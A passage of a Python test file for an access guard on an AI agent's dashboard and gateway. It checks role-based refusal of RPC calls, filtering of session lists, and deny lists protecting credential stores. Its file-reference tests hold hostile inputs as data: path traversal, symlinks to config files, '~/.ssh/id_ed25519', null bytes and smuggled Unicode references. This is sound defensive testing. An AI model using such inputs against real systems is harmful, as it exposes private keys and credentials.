    (answer("srq-own-sudo", {"value": "placeholder"}), "denied_answer_kind"),
    ({"jsonrpc": "2.0", "id": "srq-own-approval"}, "denied_gateway_frame"),
    ({"jsonrpc": "2.0", "result": {"choice": "once"}}, "denied_gateway_frame"),
    ({"jsonrpc": "2.0"}, "denied_gateway_frame"),
])
def test_a_resident_response_frame_is_refused_unless_it_answers_its_own_request_with_once_session_or_deny(
        gateway, frame, code):
    [resp] = gateway.talk("resident", [frame])
    assert refused(resp) or refused(resp, "not_own_session"), resp
    assert gateway.calls == [] and gateway.guard.counts()[code] == 1


@pytest.mark.parametrize("frame", [
    answer("srq-own-approval", {"choice": "once"}), answer("srq-own-approval", {"choice": "session"}),
    answer("srq-own-approval", {"choice": "deny"}), answer("srq-own-approval", {}),
    answer("srq-own-approval", {"choice": "once", "all": True}),
    answer("srq-own-approval", error={"code": -32601, "message": "no handler"}),
    answer("srq-own-clarify", {"answer": "blue"}), answer("srq-own-clarify", {"answers": {"q1": "x"}}),
])
def test_a_resident_answers_its_own_approval_with_once_session_or_deny(gateway, frame):
    [resp] = gateway.talk("resident", [frame])
    assert resp == {"id": frame["id"], "result": "ran"} and gateway.calls == [None]


@pytest.mark.parametrize("params,ok", [
    ({"id": "srq-own-approval", "result": {"choice": "once"}}, True),
    ({"id": "srq-own-clarify", "result": {"answer": "x"}}, True),
    ({"id": "srq-own-approval", "result": {"choice": "always"}}, False),
    ({"id": "srq-admin-approval", "result": {"choice": "once"}}, False),
    ({"id": "srq-unknown", "result": {"choice": "once"}}, False),
    ({"id": "srq-own-secret", "result": {"value": "x"}}, False),
    ({"id": "srq-own-approval", "result": "always"}, False),
    ({"id": "srq-own-approval"}, False),
    ({}, False),
])
def test_request_answer_follows_the_rules_of_a_response_frame(gateway, params, ok):
    [resp] = gateway.talk("resident", [rpc("request.answer", params)])
    assert ("error" not in resp) is ok, resp
    assert gateway.calls == (["request.answer"] if ok else [])


@pytest.mark.parametrize("role", ["admin", "internal"])
def test_admin_and_the_pty_child_answer_anything(gateway, role):
    frames = [answer("srq-own-approval", {"choice": "always"}), answer("srq-admin-approval", {"choice": "always"}),
              rpc("request.answer", {"id": "srq-x", "result": {"choice": "always"}}, rid=3)]
    out = gateway.talk(role, frames)
    assert all(r["result"] == "ran" for r in out) and gateway.calls == [None, None, "request.answer"]


@pytest.mark.parametrize("role", ["admin", "internal"])
def test_admin_and_the_pty_child_call_every_method(gateway, role):
    names = ["shell.exec", "plugins.manage", "approval.respond", "file.attach", "session.resume"]
    out = gateway.talk(role, [rpc(m, {"choice": "always", "path": "/x", "session_id": "admin-sid"}, rid=i)
                              for i, m in enumerate(names)])
    assert all(r["result"] == "ran" for r in out) and gateway.calls == names


def test_a_connection_without_a_role_is_a_resident(gateway):
    [resp] = gateway.talk(None, [rpc("shell.exec")])
    assert refused(resp) and gateway.calls == []


def test_a_dispatch_with_no_dashboard_socket_behind_it_is_untouched(gateway):
    """The stdio TUI and in-process callers: no context role and no socket transport."""
    assert gateway.server.dispatch(rpc("shell.exec")) == {"id": 1, "result": "ran"}
    stdio = SimpleNamespace(write=lambda obj: True)
    assert gateway.server.dispatch(rpc("shell.exec"), stdio) == {"id": 1, "result": "ran"}
    assert gateway.server.dispatch(answer("srq-admin-approval", {"choice": "always"}), stdio)["result"] == "ran"
    assert gateway.calls == ["shell.exec", "shell.exec", None]


def test_a_socket_transport_outside_the_context_is_judged_by_its_socket(gateway):
    """A connection that started before the gateway wrapper (an admin's) or a dispatch that lost the
    context still carries the socket: its role decides, and no role is a resident."""
    resident, admin, unknown = ws("/api/ws"), ws("/api/ws"), ws("/api/ws")
    resident._edgecity_ws_role, admin._edgecity_ws_role = "resident", "admin"
    assert refused(gateway.server.dispatch(rpc("shell.exec"), Transport(resident)))
    assert refused(gateway.server.dispatch(rpc("shell.exec"), Transport(unknown)))
    assert gateway.server.dispatch(rpc("shell.exec"), Transport(admin))["result"] == "ran"
    own = rpc("prompt.submit", {"session_id": "own-sid", "text": "hi"})
    assert gateway.server.dispatch(own, Transport(resident))["result"] == "ran"
    assert refused(gateway.server.dispatch(answer("srq-own-approval", {"choice": "always"}), Transport(resident)))
    assert gateway.calls == ["shell.exec", "prompt.submit"]


def test_an_exception_in_the_method_guard_is_a_refusal(gateway, monkeypatch):
    def boom(*a):
        raise RuntimeError("guard broke")

    monkeypatch.setattr(gateway.guard, "gateway_decision", boom)
    [resp] = gateway.talk("resident", [rpc("prompt.submit", {"session_id": "own-sid"})])
    assert refused(resp) and gateway.calls == []


def test_an_exception_reading_the_live_state_is_a_refusal(gateway):
    class Exploding(dict):
        def get(self, *a):
            raise RuntimeError("table broke")

    gateway.server._sessions = Exploding()
    [resp] = gateway.talk("resident", [rpc("session.title", {"session_id": "own-sid"})])
    assert refused(resp) and gateway.calls == []


def test_a_failing_stored_lookup_refuses_the_resume(gateway):
    def boom(*a, **k):
        raise OSError("state.db unreadable")

    gateway.guard.set_session_lookup(boom)
    [resp] = gateway.talk("resident", [rpc("session.resume", {"session_id": "abc123"})])
    assert refused(resp) and gateway.calls == []
    gateway.guard.set_session_lookup(None)
    [resp] = gateway.talk("resident", [rpc("session.resume", {"session_id": "abc123"})])
    assert refused(resp, "not_own_session") and gateway.calls == []


def test_the_gateway_wrappers_are_one_layer_and_both_or_neither(gateway):
    g = gateway.guard
    dispatch, handle = gateway.server.dispatch, gateway.ws.handle_ws
    assert g.install_gateway(gateway.server, gateway.ws) is True
    assert gateway.server.dispatch._edgecity_original is dispatch._edgecity_original
    assert gateway.ws.handle_ws._edgecity_original is handle._edgecity_original
    fresh = load_copy(g, "edgecity_test_resident_guard_copy3")
    half = SimpleNamespace(dispatch=lambda *a: None)
    assert fresh.install_gateway(half, SimpleNamespace()) is False
    assert not getattr(half.dispatch, "_edgecity_resident_guard", False) and fresh.installed()["gateway"] is False


def test_the_role_reaches_a_long_handler_on_the_pool(gateway):
    """Hermes copies the context into its pool (`rpc_dispatch.py:70`), as to_thread does."""
    import concurrent.futures
    import contextvars

    pool = concurrent.futures.ThreadPoolExecutor(1)
    token = gateway.guard._GATEWAY_ROLE.set("resident")
    try:
        ctx = contextvars.copy_context()
        seen = pool.submit(lambda: ctx.run(gateway.guard._GATEWAY_ROLE.get)).result()
    finally:
        gateway.guard._GATEWAY_ROLE.reset(token)
        pool.shutdown()
    assert seen == "resident"


# ---- N3: a ticket minted inside a gateway call carries the connection's role ---------------------


@pytest.mark.parametrize("gateway_role,request_role,stamped", [
    ("admin", None, "admin"), ("resident", None, "resident"), ("internal", None, "resident"),
    ("resident", "admin", "resident"), ("admin", "resident", "admin"), (None, "admin", "admin"),
    (None, None, "resident"), ("Admin", None, "resident"),
])
def test_a_ticket_minted_inside_a_gateway_call_carries_the_connections_role(sockets, gateway_role, request_role, stamped):
    g, store = sockets.guard, sockets.store
    t1 = g._GATEWAY_ROLE.set(gateway_role)
    t2 = g._REQUEST_ROLE.set(request_role)
    try:
        ticket = store.mint_ticket(user_id="display:v1", provider="bot-desktop", extra={"viewer_id": "v1"})
    finally:
        g._REQUEST_ROLE.reset(t2)
        g._GATEWAY_ROLE.reset(t1)
    assert store.tickets[ticket]["edgecity_role"] == stamped and store.tickets[ticket]["viewer_id"] == "v1"


def test_an_admin_connection_outside_the_context_mints_as_admin(gateway):
    """`dispatch_guarded` carries a socket's own role into the call when the handle_ws context is
    missing, so a ticket minted inside it is stamped with that role."""
    seen = []
    g = gateway.guard
    original = gateway.server.dispatch._edgecity_original

    def dispatch(req, transport=None):
        seen.append(g.minting_role())
        return original(req, transport)

    gateway.server.dispatch = dispatch
    assert g.install_gateway(gateway.server, gateway.ws) is True
    admin = ws("/api/ws")
    admin._edgecity_ws_role = "admin"
    gateway.server.dispatch(rpc("display.observe"), Transport(admin))
    assert seen == ["admin"] and g._GATEWAY_ROLE.get() is None


# ---- S-new-2 / S-new-3: Hermes's agent reads ------------------------------------------------------


def file_safety_stand_in():
    entries = (("mcp-tokens", "d", "f"), ("vault", "d", "f"))
    return SimpleNamespace(_READ_DENIED_DIRS=entries, get_read_block_error=lambda path: None)


def test_the_key_store_joins_the_agent_read_deny_list_once(guard):
    fs = file_safety_stand_in()
    assert guard.harden_agent_reads(fs, [".dashboard-auth-edgecity", "/opt/plugin"]) is True
    assert guard.harden_agent_reads(fs, [".dashboard-auth-edgecity", "/opt/plugin"]) is True
    names = [entry[0] for entry in fs._READ_DENIED_DIRS]
    assert names == ["mcp-tokens", "vault", ".dashboard-auth-edgecity", "/opt/plugin"]
    assert all(len(e) == 3 and all(isinstance(x, str) and x for x in e) for e in fs._READ_DENIED_DIRS)
    assert guard.installed()["agent_reads"] is True


@pytest.mark.parametrize("module", [
    SimpleNamespace(),
    SimpleNamespace(_READ_DENIED_DIRS=(("a", "b", "c"),)),                                  # no get_read_block_error
    SimpleNamespace(_READ_DENIED_DIRS=["mcp-tokens"], get_read_block_error=lambda p: None),  # reshaped
    SimpleNamespace(_READ_DENIED_DIRS=(("a", "b"),), get_read_block_error=lambda p: None),
    SimpleNamespace(_READ_DENIED_DIRS=frozenset(), get_read_block_error=lambda p: None),
])
def test_a_reshaped_deny_list_is_not_touched_and_reported(guard, module):
    before = getattr(module, "_READ_DENIED_DIRS", None)
    assert guard.harden_agent_reads(module, [".dashboard-auth-edgecity"]) is False
    assert getattr(module, "_READ_DENIED_DIRS", None) == before and guard.installed()["agent_reads"] is False


def test_a_reference_to_a_private_path_under_home_is_refused_for_everyone(guard, home, tmp_path):
    calls = []
    refs = SimpleNamespace(_ensure_reference_path_allowed=lambda path: calls.append(path))
    assert guard.harden_reference_reads(refs) is True
    for private in (home / "config.yaml", home / "plugins" / "p1" / "__init__.py", home / "hooks" / "h.sh",
                    home / ".dashboard-auth-edgecity", home / ".dashboard-auth-edgecity" / "sessions.sqlite3",
                    home / "state.db"):
        with pytest.raises(ValueError):
            refs._ensure_reference_path_allowed(private)
    for fine in (home / "resident-chat" / "notes.md", home / "AGENTS.md", tmp_path / "elsewhere" / "plugins" / "x.py"):
        refs._ensure_reference_path_allowed(fine)
    assert len(calls) == 9 and guard.counts()["denied_context_reference"] == 6
    assert guard.harden_reference_reads(refs) is True
    assert refs._ensure_reference_path_allowed._edgecity_original is not None
    assert guard.harden_reference_reads(SimpleNamespace()) is False


def test_hermess_own_refusal_still_comes_first(guard, home):
    def hermes_refuses(path):
        raise ValueError("path is a sensitive credential file")

    refs = SimpleNamespace(_ensure_reference_path_allowed=hermes_refuses)
    guard.harden_reference_reads(refs)
    with pytest.raises(ValueError, match="sensitive credential"):
        refs._ensure_reference_path_allowed(home / "notes.md")


# ---- S-r3-1: every session list a resident keeps carries only its own rows -----------------------


def listed_ids(resp):
    return [row["id"] for row in resp.body["sessions"]]


def test_a_residents_session_list_carries_only_its_own_rows(dash):
    """Own login, Telegram source: listed. Another login (on any source), no login on a terminal or
    cron source, no user_id, no source, neither: not listed, and neither is their preview or title.
    `total` counts the resident's rows only."""
    resp, _ = dash.request("GET", "/api/sessions", headers=dash.login(OWNER))
    assert resp.status_code == 200
    assert listed_ids(resp) == ["abc123", "tg1"]
    assert resp.body["total"] == 2 and resp.body["limit"] == 20 and resp.body["offset"] == 0
    text = repr(resp.body)
    for other in ("adm1", "pty1", "cron1", "tg-adm", "no-user", "no-source", "bare"):
        assert f"first message of {other}" not in text and f"title of {other}" not in text, other
    assert dash.mod.counts()["resident_list_filtered"] == 1


def test_an_admin_and_the_archive_bearer_get_hermess_own_list(dash):
    for kwargs in ({"headers": dash.login(ADMIN)}, {"token_principal": True}):
        resp, _ = dash.request("GET", "/api/sessions?full=1", **kwargs)
        assert resp.status_code == 200 and resp.body == {"path": "/api/sessions"}, kwargs
    assert dash.list_calls == []


@pytest.mark.parametrize("login,ids", [
    (session(provider="edgecity", org_id="owner"), ["abc123", "tg1"]),
    (SimpleNamespace(provider="edgecity", org_id="owner", user_id=None), ["tg1"]),
    (session(provider="basic", org_id="owner"), ["tg1"]),
])
def test_a_resident_without_a_matching_login_sees_its_channels_only(dash, login, ids):
    resp, _ = dash.request("GET", "/api/sessions", headers=dash.login(login))
    assert listed_ids(resp) == ids


def test_the_residents_list_pages_through_its_own_rows_past_other_logins(dash):
    """250 cron rows before the resident's own: the resident's page 1 still shows its rows, and the
    pages and the total are the resident's (Hermes's own `le=100` per read)."""
    rows = [{"id": f"cron-{i}", "user_id": None, "source": "cron"} for i in range(250)]
    rows += [{"id": f"own-{i}", "user_id": "edgecity:u1", "source": "tool"} for i in range(30)]
    dash.mod.set_session_list(list_page(rows, dash.list_calls))
    first, _ = dash.request("GET", "/api/sessions?limit=20&offset=0", headers=dash.login(OWNER))
    second, _ = dash.request("GET", "/api/sessions?limit=20&offset=20", headers=dash.login(OWNER))
    assert listed_ids(first) == [f"own-{i}" for i in range(20)] and first.body["total"] == 30
    assert listed_ids(second) == [f"own-{i}" for i in range(20, 30)] and second.body["offset"] == 20
    assert {limit for _q, limit, _o in dash.list_calls} == {100}
    assert [o for _q, _l, o in dash.list_calls[:3]] == [0, 100, 200]


def test_the_lists_filters_and_order_reach_hermess_handler(dash):
    dash.request("GET", "/api/sessions?order=recent&exclude_sources=cron&min_messages=1&profile=default&limit=5",
                 headers=dash.login(OWNER))
    query, limit, offset = dash.list_calls[0]
    assert query == {"order": "recent", "exclude_sources": "cron", "min_messages": "1", "profile": "default",
                     "limit": "5"} and (limit, offset) == (100, 0)


def test_rows_hermes_repeats_on_every_page_are_listed_once(dash):
    pinned = {"id": "abc123", "user_id": "edgecity:u1", "source": "tool"}

    def page(query, limit, offset):
        rows = [{"id": f"cron-{offset + i}", "user_id": None, "source": "cron"} for i in range(min(limit, 150 - offset))]
        return {"sessions": rows + [dict(pinned)], "total": 150, "storage": {}}

    dash.mod.set_session_list(page)
    resp, _ = dash.request("GET", "/api/sessions", headers=dash.login(OWNER))
    assert listed_ids(resp) == ["abc123"] and resp.body["total"] == 1


def test_a_box_bigger_than_the_scan_lists_none_of_the_rest(dash, monkeypatch):
    monkeypatch.setattr(dash.mod, "LIST_SCAN_ROWS", 200)
    rows = [{"id": f"cron-{i}", "user_id": None, "source": "cron"} for i in range(300)]
    rows.append({"id": "own-late", "user_id": "edgecity:u1", "source": "tool"})
    dash.mod.set_session_list(list_page(rows, dash.list_calls))
    resp, _ = dash.request("GET", "/api/sessions", headers=dash.login(OWNER))
    assert resp.status_code == 200 and listed_ids(resp) == [] and resp.body["total"] == 0
    assert len(dash.list_calls) == 2 and dash.mod.counts()["resident_list_truncated"] == 1


@pytest.mark.parametrize("breakage", ["no_reader", "raises", "not_a_list", "no_total", "bad_paging"])
def test_a_list_the_guard_cannot_filter_is_a_503_never_hermess_page(dash, breakage):
    target = "/api/sessions"
    if breakage == "no_reader":
        dash.mod.set_session_list(None)
    elif breakage == "raises":
        dash.mod.set_session_list(lambda q, l, o: (_ for _ in ()).throw(OSError("state.db busy")))
    elif breakage == "not_a_list":
        dash.mod.set_session_list(lambda q, l, o: {"sessions": "x", "total": 1})
    elif breakage == "no_total":
        dash.mod.set_session_list(lambda q, l, o: {"sessions": []})
    else:
        target = "/api/sessions?limit=x"
    resp, _ = dash.request("GET", target, headers=dash.login(OWNER))
    assert resp.status_code == 503 and resp.body["reason"] == "session_list_unavailable", resp.body
    assert dash.mod.counts()["denied_session_list_error"] == 1


def test_hermess_own_error_on_the_list_goes_out_as_it_is(dash):
    async def router(request):
        dash.routed.append((request.method, request.scope["path"]))
        return Response(400, {"detail": "archived must be one of: exclude, only, include"})

    dash.router = router
    resp, _ = dash.request("GET", "/api/sessions?archived=x", headers=dash.login(OWNER))
    assert resp.status_code == 400 and dash.list_calls == []


def test_a_streamed_list_body_is_read_and_replaced(dash):
    streamed = Streamed([b'{"sessions": [{"id": "adm1", "preview": "first message of adm1"}]}'],
                        content_type="application/json")

    async def router(request):
        dash.routed.append((request.method, request.scope["path"]))
        return streamed

    dash.router = router
    resp, _ = dash.request("GET", "/api/sessions", headers=dash.login(OWNER))
    assert listed_ids(resp) == ["abc123", "tg1"] and "adm1" not in repr(resp.body)


def test_the_box_wide_counts_are_an_admins(dash):
    for target in ("/api/sessions/stats", "/api/sessions/empty/count"):
        assert forbidden(dash.request("GET", target, headers=dash.login(OWNER))[0]), target
        assert dash.request("GET", target, headers=dash.login(ADMIN))[0].status_code == 200, target


@pytest.mark.parametrize("query,ok", [
    ("full=1", False), ("full=true", False), ("full=True", False), ("full=yes", False), ("full=on", False),
    ("full=", False), ("full=2", False), ("full=0&full=1", False), ("full=1&full=0", False),
    ("full=0", True), ("full=false", True), ("full=FALSE", True), ("full=no", True), ("full=off", True),
    ("full= 0 ", True), ("fully=1", True),
])
def test_the_full_list_is_an_admins(dash, query, ok):
    resp, _ = dash.request("GET", f"/api/sessions?{query}", headers=dash.login(OWNER))
    assert (resp.status_code == 200) is ok and (ok or forbidden(resp)), (query, resp.body)


# ---- S-r3-1 on the gateway: session.list and session.most_recent ---------------------------------


def test_a_residents_gateway_session_list_carries_only_its_own_rows(gateway):
    [resp] = gateway.talk("resident", [rpc("session.list", {"limit": 50})])
    assert [r["id"] for r in resp["result"]["sessions"]] == ["abc123", "tg1"]
    assert "first message of adm1" not in repr(resp)
    [admin] = gateway.talk("admin", [rpc("session.list", {})])
    assert len(admin["result"]["sessions"]) == len(LIST_ROWS)


def test_session_most_recent_names_only_the_residents_chat(gateway):
    gateway.server.most_recent = "abc123"
    [own] = gateway.talk("resident", [rpc("session.most_recent")])
    assert own["result"]["session_id"] == "abc123"
    for other in ("adm1", "pty1", "cron1", "tg-adm", "unknown-id", 7):
        gateway.server.most_recent = other
        [resp] = gateway.talk("resident", [rpc("session.most_recent")])
        assert resp["result"] == {"session_id": None}, other
    gateway.server.most_recent = None
    assert gateway.talk("resident", [rpc("session.most_recent")])[0]["result"]["session_id"] is None
    gateway.server.most_recent = "adm1"
    assert gateway.talk("admin", [rpc("session.most_recent")])[0]["result"]["session_id"] == "adm1"


def test_the_long_handler_reply_is_filtered_on_its_way_out(gateway):
    """Hermes runs `session.list` on its pool and the worker writes the reply through the transport
    it was handed (`rpc_dispatch.py`): that write is filtered, every other frame is not."""
    written = []

    def dispatch(req, transport=None):
        gateway.calls.append(req.get("method"))
        transport.write({"jsonrpc": "2.0", "method": "event", "params": {"type": "x", "id": req["id"]}})
        transport.write({"jsonrpc": "2.0", "id": req["id"], "result": {"sessions": [
            {"id": "adm1", "preview": "first message of adm1"}, {"id": "tg1", "preview": "mine"}]}})
        return None

    original = gateway.server.dispatch._edgecity_original
    gateway.server.dispatch._edgecity_original = dispatch
    gateway.guard.install_gateway(gateway.server, gateway.ws, gateway.server.requests, gateway.server.approvals)
    sock = ws("/api/ws")
    sock.transport = Transport(sock)
    sock.transport.write = written.append
    try:
        assert gateway.talk("resident", [rpc("session.list", rid=5)], sock=sock) == [None]
    finally:
        gateway.server.dispatch._edgecity_original = original
    assert written[0]["method"] == "event"
    assert written[1]["id"] == 5 and [r["id"] for r in written[1]["result"]["sessions"]] == ["tg1"]


def test_the_filtering_transport_is_the_connections_own_for_everything_else(guard):
    inner = SimpleNamespace(auth_identity={"user_id": "u1"}, _ws="sock", writes=[])
    inner.write = inner.writes.append
    proxy = guard.FilteredReplies(inner, 9, lambda frame: {**frame, "result": "kept"})
    assert proxy.auth_identity == {"user_id": "u1"} and proxy._ws == "sock"
    proxy.write({"id": 9, "result": "all"})
    proxy.write({"id": 8, "result": "other"})
    proxy.write({"id": 9, "method": "event"})
    assert inner.writes == [{"id": 9, "result": "kept"}, {"id": 8, "result": "other"}, {"id": 9, "method": "event"}]


@pytest.mark.parametrize("breakage", ["no_owners", "owners_raise", "not_a_list", "not_a_dict"])
def test_a_gateway_list_the_guard_cannot_filter_is_refused(gateway, breakage):
    if breakage == "no_owners":
        gateway.guard.set_session_owners(None)
    elif breakage == "owners_raise":
        gateway.guard.set_session_owners(lambda ids, profile=None: (_ for _ in ()).throw(OSError("busy")))
    else:
        reply = {"sessions": "x"} if breakage == "not_a_list" else "x"
        gateway.server.dispatch._edgecity_original = lambda req, transport=None: {"id": req["id"], "result": reply}
        gateway.guard.install_gateway(gateway.server, gateway.ws, gateway.server.requests, gateway.server.approvals)
    [resp] = gateway.talk("resident", [rpc("session.list")])
    assert refused(resp), resp
    assert gateway.guard.counts()["denied_gateway_list_error"] == 1


def test_a_gateway_lists_error_reply_goes_out_as_it_is(gateway):
    gateway.server.dispatch._edgecity_original = lambda req, transport=None: {"id": req["id"], "error": {"code": 5006}}
    gateway.guard.install_gateway(gateway.server, gateway.ws, gateway.server.requests, gateway.server.approvals)
    assert gateway.talk("resident", [rpc("session.list")]) == [{"id": 1, "error": {"code": 5006}}]


# ---- S-r3-2: a resident's @file: to its uploads, pastes and chat directory -----------------------

_REF = re.compile(r"(?<![\w/])@(?P<kind>file|folder):(?P<value>`[^`\n]+`|\"[^\"\n]+\"|'[^'\n]+'|\S+)")


def stand_in_parser(text):
    """Hermes's `parse_context_references` in miniature (quotes stripped, no line ranges)."""
    out = []
    for m in _REF.finditer(text):
        value = m.group("value").rstrip(",.;!?")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in "`\"'":
            value = value[1:-1]
        out.append(SimpleNamespace(kind=m.group("kind"), target=value, start=m.start(), end=m.end()))
    return out


@pytest.fixture
def uploads(guard, home):
    """HERMES_HOME with an upload, a paste, a chat-directory file and the hostile shapes S-r3-2 names."""
    guard.set_reference_parser(stand_in_parser)
    (home / "AGENTS.md").write_text("# village rules\n")
    chat = Path(guard.resident_cwd())
    assert os.path.islink(chat / "AGENTS.md")
    (home / "attachments").mkdir()
    (home / "attachments" / "notes.txt").write_text("harmless notes")
    (home / "attachments" / "my notes.txt").write_text("harmless notes")
    (home / "composer-pastes").mkdir()
    (home / "composer-pastes" / "paste-1.txt").write_text("a long paste")
    (chat / "draft.md").write_text("a draft")
    (home / "config.yaml").write_text("probe_key: example-not-a-key\n")
    (home / ".env").write_text("X=example-not-a-key\n")
    os.symlink(home / "config.yaml", home / "attachments" / "cfg.txt")
    os.symlink(home, home / "attachments" / "up")
    (home / "attachments" / "sub").mkdir()
    return SimpleNamespace(home=home, chat=str(chat))


@pytest.mark.parametrize("target,ok", [
    ("{home}/attachments/notes.txt", True),
    ("{home}/attachments/my notes.txt", True),
    ("{home}/attachments/not-there-yet.txt", True),
    ("{home}/composer-pastes/paste-1.txt", True),
    ("{home}/resident-chat/draft.md", True),
    ("draft.md", True),                                     # relative to the chat's own directory
    ("./draft.md", True),
    ("../attachments/notes.txt", True),
    ("{home}/attachments/../config.yaml", False),
    ("{home}/attachments/cfg.txt", False),                  # a link to config.yaml
    ("{home}/attachments/up/config.yaml", False),           # a link to HERMES_HOME
    ("{home}/attachments/up/attachments/notes.txt", True),  # resolves back inside: the file itself
    ("{home}/.env", False),
    ("{home}/config.yaml", False),
    ("../config.yaml", False),
    ("{home}/attachments", False),                          # the directory, not a file in it
    ("{home}/attachments/sub", False),                      # a directory
    ("{home}/attachments/x.env", False),                    # a private name, even in the uploads
    ("{home}/attachments/config.yaml", False),
    ("{home}/resident-chat/AGENTS.md", False),              # the link out to the box's own
    ("{home}/images/a.png", False),
    ("{home}/attachments-other/a.txt", False),
    ("/etc/hostname", False),
    ("~/.ssh/id_ed25519", False),
    ("", False), ("   ", False), (None, False), (7, False), ("{home}/attachments/a\x00.txt", False),
])
def test_resident_file_allowed(guard, uploads, target, ok):
    value = target.format(home=uploads.home) if isinstance(target, str) else target
    assert guard.resident_file_allowed(value, uploads.chat) is ok, value


def test_no_file_is_admitted_from_a_chat_outside_the_resident_directory(guard, uploads):
    good = f"{uploads.home}/attachments/notes.txt"
    assert guard.resident_file_allowed(good, uploads.chat + "/") is True
    for cwd in (str(uploads.home), "/", None, "", str(uploads.home / "attachments"), 7):
        assert guard.resident_file_allowed(good, cwd) is False, cwd


def test_an_uploads_directory_that_is_a_link_admits_nothing(guard, uploads, tmp_path):
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "a.txt").write_text("x")
    os.rename(uploads.home / "composer-pastes", tmp_path / "old-pastes")
    os.symlink(elsewhere, uploads.home / "composer-pastes")
    assert guard.resident_file_allowed(f"{uploads.home}/composer-pastes/a.txt", uploads.chat) is False


def own_chat_in(gateway, cwd):
    gateway.server._sessions["own-sid"]["cwd"] = cwd


@pytest.mark.parametrize("text", [
    "summarise @file:{home}/attachments/notes.txt",
    "summarise @file:`{home}/attachments/my notes.txt`",
    "@file:{home}/composer-pastes/paste-1.txt and @file:draft.md.",
    "(see @file:{home}/attachments/notes.txt)",
])
def test_a_resident_prompt_may_name_its_own_uploads(gateway, uploads, text):
    own_chat_in(gateway, uploads.chat)
    [resp] = gateway.talk("resident", [rpc("prompt.submit", {"session_id": "own-sid",
                                                             "text": text.format(home=uploads.home)})])
    assert "error" not in resp, resp
    assert gateway.calls == ["prompt.submit"]


@pytest.mark.parametrize("text", [
    "@file:{home}/attachments/../config.yaml",
    "@file:{home}/attachments/cfg.txt",
    "@file:{home}/.env",
    "@folder:{home}/attachments",
    "@folder:.",
    "@folder:{home}/attachments/notes.txt",                   # @folder: is never admitted, even to a file
    "@folder:{home}/attachments/not-there-yet",
    "@file:{home}/attachments/notes.txt @file:{home}/config.yaml",
    "@file:{home}/attachments/notes.txt @folder:{home}/attachments",
    "@file:{home}/attachments/notes.txt ＠file:config.yaml",
    "@fi @file:{home}/attachments/notes.txt le:config.yaml",  # blanking must not hide what folding builds
    "x@file:{home}/attachments/notes.txt",                     # not a Hermes reference: the strict rule stands
    "@FILE:{home}/attachments/notes.txt",
])
def test_a_resident_prompt_naming_anything_else_is_refused(gateway, uploads, text):
    own_chat_in(gateway, uploads.chat)
    [resp] = gateway.talk("resident", [rpc("prompt.submit", {"session_id": "own-sid",
                                                             "text": text.format(home=uploads.home)})])
    assert refused(resp) and gateway.calls == [], resp


def test_an_upload_is_refused_from_a_chat_that_runs_elsewhere_or_without_a_parser(gateway, uploads):
    text = f"summarise @file:{uploads.home}/attachments/notes.txt"
    own_chat_in(gateway, str(uploads.home))
    assert refused(gateway.talk("resident", [rpc("prompt.submit", {"session_id": "own-sid", "text": text})])[0])
    own_chat_in(gateway, uploads.chat)
    gateway.guard.set_reference_parser(None)
    assert refused(gateway.talk("resident", [rpc("prompt.submit", {"session_id": "own-sid", "text": text})])[0])
    gateway.guard.set_reference_parser(lambda t: (_ for _ in ()).throw(RuntimeError("broken")))
    assert refused(gateway.talk("resident", [rpc("prompt.submit", {"session_id": "own-sid", "text": text})])[0])
    gateway.guard.set_reference_parser(lambda t: [SimpleNamespace(kind="file", target="x", start=5, end=2)])
    assert refused(gateway.talk("resident", [rpc("prompt.submit", {"session_id": "own-sid", "text": text})])[0])
    assert gateway.calls == []


def test_the_upload_check_also_reads_what_hermess_sanitiser_hands_on(gateway, uploads):
    """Hermes expands the sanitised text (`methods_prompt.py:569`): a reference that only appears
    once the sanitiser has run is judged too."""
    own_chat_in(gateway, uploads.chat)
    gateway.guard.set_prompt_sanitizer(lambda t: t.replace("<x>", ""))
    text = f"@file:{uploads.home}/attachments/notes.txt<x>/../../config.yaml"
    assert refused(gateway.talk("resident", [rpc("prompt.submit", {"session_id": "own-sid", "text": text})])[0])
    ok = f"@file:{uploads.home}/attachments/notes.txt"
    assert "error" not in gateway.talk("resident", [rpc("prompt.submit", {"session_id": "own-sid", "text": ok})])[0]


def test_an_admin_prompt_is_not_judged(gateway, uploads):
    [resp] = gateway.talk("admin", [rpc("prompt.submit", {"session_id": "admin-sid", "text": "@folder:/"})])
    assert "error" not in resp



# ---- lazy seams and Hermes's own read guard ------------------------------------------------------


def test_a_lazy_seam_installs_on_first_need_and_only_when_its_module_is_loaded(guard):
    files = SimpleNamespace(_SENSITIVE_MANAGED_DIR_NAMES=frozenset({"mcp-tokens", "pairing"}))
    loaded = {"files": None}
    guard.set_loader("files", lambda: loaded["files"])
    assert guard._ensure("files") is False and "denied_seam_files_missing" not in guard.counts()
    loaded["files"] = files
    assert guard._ensure("files") is True
    assert files._SENSITIVE_MANAGED_DIR_NAMES == {"mcp-tokens", "pairing", ".dashboard-auth-edgecity"}
    assert guard.harden_file_routes(SimpleNamespace()) is False


def test_the_file_guard_installs_on_the_first_request(dash):
    files = SimpleNamespace(_SENSITIVE_MANAGED_DIR_NAMES=frozenset({"pairing"}))
    dash.mod.set_loader("files", lambda: files)
    dash.request("GET", "/api/sessions", headers=dash.login(OWNER))
    assert ".dashboard-auth-edgecity" in files._SENSITIVE_MANAGED_DIR_NAMES


# ---- round 4 (1.4.0): the Chat tab with a per-PTY credential (stand-ins for chat_ws's PTY seams) --


class Refused(Exception):
    """What the PTY handler shows for a chat refused after accept (Hermes: HTTPException)."""


class Full(Exception):
    """Hermes's RegistryFull."""


class Unavailable(RuntimeError):
    """Hermes's PtyUnavailableError."""


def pty_ticket_store():
    """`ws_tickets` in miniature, with the process-wide internal credential."""
    store = ticket_store()
    store._internal_credential = "server-cred"

    def consume_internal_credential(value):
        if value != store._internal_credential:
            raise TicketInvalid("internal credential mismatch")
        return {"user_id": "server-internal", "provider": "server-internal"}

    store.consume_internal_credential = consume_internal_credential
    store.internal_ws_credential = lambda: store._internal_credential
    return store


class StandInBridge:
    """`pty_bridge.PtyBridge` in miniature: `spawn` records the env; `read` gives EOF once `exit()`."""

    spawned: list = []

    def __init__(self, argv, env):
        self.argv, self.env, self.closed, self.exited = argv, env, False, False

    @classmethod
    def spawn(cls, argv, *, cwd=None, env=None):
        bridge = cls(argv, env)
        StandInBridge.spawned.append(bridge)
        return bridge

    def read(self, timeout=0.2):
        return None if self.exited else b""

    def close(self):
        self.closed = True


class StandInSession:
    def __init__(self, key, bridge):
